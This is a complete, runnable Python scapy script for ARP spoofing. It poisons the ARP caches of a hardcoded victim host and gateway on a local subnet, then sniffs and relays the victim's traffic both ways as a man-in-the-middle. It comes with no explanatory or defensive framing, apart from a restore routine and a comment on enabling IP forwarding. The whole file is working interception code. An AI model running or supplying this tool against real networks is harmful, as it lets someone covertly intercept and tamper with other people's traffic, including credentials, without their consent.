#!/usr/bin/python3

from scapy.all import *
import multiprocessing as mp
import time

targetip= "192.168.6.11"
gatewayip= "192.168.6.1"

victimmac= getmacbyip(targetip)
gatewaymac= getmacbyip(gatewayip)

def main():
	try:
		spoof = mp.Process(target=spoofing_process, args=(targetip, victimmac, gatewayip, gatewaymac))
		tovictim = mp.Process(target=sniff_tovictim_process, args=(targetip,victimmac))
		togateway = mp.Process(target=sniff_togateway_process, args=(targetip,gatewaymac))
		
		spoof.start()
		tovictim.start()
		togateway.start()
		
		while True:
			continue

	except Exception as e:
		print(e)
	finally:
		active = mp.active_children()
		for child in active:
			child.terminate()
			child.join()
		print ("ARP spoofing stopped")
		restorearp(gatewayip, gatewaymac, targetip, victimmac)
		restorearp(targetip, victimmac, gatewayip, gatewaymac)
		quit()


def spoofarpcache(targetip, victimmac, sourceip):
	spoofed= [Ether(dst=victimmac)/ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= victimmac)]
	sendp(spoofed, verbose=False)

def restorearp(targetip, victimmac, sourceip, sourcemac):
	packet= [Ether(dst=victimmac)/ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= victimmac , pdst= targetip)]
	sendp(packet, verbose=False)
	print("ARP Table restored to normal for", targetip)

def spoofing_process(targetip, victimmac, gatewayip, gatewaymac):
	print ("Sending spoofed ARP responses")
	while True:
		spoofarpcache(targetip, victimmac, gatewayip)
		spoofarpcache(gatewayip, gatewaymac, targetip)
		time.sleep(1)
		
def sendtogateway(packet):
	global gatewaymac
	packet[Ether].src = Ether().src
	packet[Ether].dst = gatewaymac
	sendp(packet)
		
def sendtovictim(packet):
	global victimmac
	packet[Ether].src = Ether().src
	packet[Ether].dst = victimmac
	sendp(packet)
	
def sniff_tovictim_process(victimip, victimmac):
	while True:
		try:
			sniff(filter= "ip dst host " + victimip, count=1, prn=sendtovictim)
		except:
			continue

def sniff_togateway_process(victimip, gatewaymac):
	while True:
		try:
			sniff(filter= "ip src host " + victimip, count=1, prn=sendtogateway)
		except:
			continue

if __name__=="__main__":
	main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
